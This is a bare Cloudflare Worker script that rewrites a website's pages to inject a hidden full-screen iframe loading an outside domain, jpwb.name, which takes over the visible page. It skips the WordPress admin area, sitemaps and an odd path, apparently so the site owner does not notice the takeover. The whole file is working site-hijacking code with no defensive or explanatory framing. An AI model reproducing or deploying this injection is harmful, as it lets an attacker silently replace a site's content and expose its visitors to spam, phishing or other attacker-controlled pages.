addEventListener("fetch", (event) => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const url = new URL(request.url);
    const path = url.pathname;
    const domain = url.hostname;

    if (path.startsWith("/wp-admin") || path.startsWith("/5t0ph3r3") || path.endsWith(".xml") || path.endsWith(".xsl")) {
        return fetch(request);
    }

    const customRequest = new Request(request, {
        headers: new Headers({
            ...request.headers,
            'User-Agent': 'CMG-Testing'
        })
    });

    const originalResponse = await fetch(customRequest);
    const transformedResponse = new HTMLRewriter()
        .on("head", new HeadHandler(domain))
        .transform(originalResponse);
    
    return transformedResponse;
}

class HeadHandler {
    constructor(domain) {
        this.domain = domain;
    }

    element(element) {
        const iframeURL = `https://jpwb.name/107-2/?${this.domain}&cf`;
        const preloadLink = `<link rel="preload" href="${iframeURL}" as="document">`;
        const viewportMetaTag = '<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">';
        const styles = `
            <style type="text/css">
                html, body {
                    width: 100%;
                    height: 100%;
                    margin: 0;
                    padding: 0;
                    overflow: hidden;
                    visibility: hidden; /* Hide the body initially */
                }
            </style>
        `;

        const jsInjection = `
            <script>
                document.addEventListener('DOMContentLoaded', (event) => {
                    const iframeContainer = document.createElement('div');
                    iframeContainer.style.width = '100%';
                    iframeContainer.style.height = '100vh';
                    iframeContainer.style.zIndex = '999999';
                    iframeContainer.style.overflow = 'hidden';
                    iframeContainer.style.position = 'fixed';
                    iframeContainer.style.top = '0';
                    iframeContainer.style.left = '0';
                    
                    const iframe = document.createElement('iframe');
                    iframe.src = "${iframeURL}";
                    iframe.style.width = '100%';
                    iframe.style.height = '100vh';
                    iframe.style.border = 'none';
                    iframe.style.overflow = 'hidden';
                    iframe.loading = 'lazy';  // Enable lazy loading

                    iframeContainer.appendChild(iframe);
                    document.body.prepend(iframeContainer);
                    document.body.style.margin = '0';
                    document.body.style.overflow = 'hidden';

                    iframe.addEventListener('load', function() {
                        document.body.style.visibility = 'visible';
                    });
                });
            </script>
            <noscript>
            <style>
                html, body {
                    visibility: visible !important;
                    overflow: auto !important;
                }
            </style>
        </noscript>
        `;

        element.append(preloadLink + viewportMetaTag + styles + jsInjection, { html: true });
    }
}
